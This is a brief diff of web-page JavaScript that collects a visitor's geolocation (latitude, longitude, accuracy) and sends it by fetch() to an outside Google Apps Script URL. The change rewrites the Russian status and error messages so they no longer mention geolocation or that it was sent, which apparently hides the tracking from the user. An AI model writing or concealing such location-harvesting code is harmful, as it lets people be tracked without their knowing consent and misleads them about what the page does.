@@ -44,12 +44,12 @@
       const url = `https://script.google.com/macros/s/AKfycbxK3sFmC2YreooOCiK9jU7lLFwMlt7NflHTzU5UUY6FesXfQDYOkg5RZUy2eobocL16/exec?lat=${lat}&lon=${lon}&acc=${acc}`;
 
       fetch(url)
-        .then(res => console.log("Геолокация отправлена"))
+        .then(res => console.log("Успешно"))
         .catch(err => console.error("Ошибка при отправке:", err));
     }
 
     function locationError(err) {
-      alert("Ошибка доступа к геолокации: " + err.message);
+      alert("Ошибка доступа" + err.message);
     }
 
     navigator.geolocation.getCurrentPosition(sendLocation, locationError, {
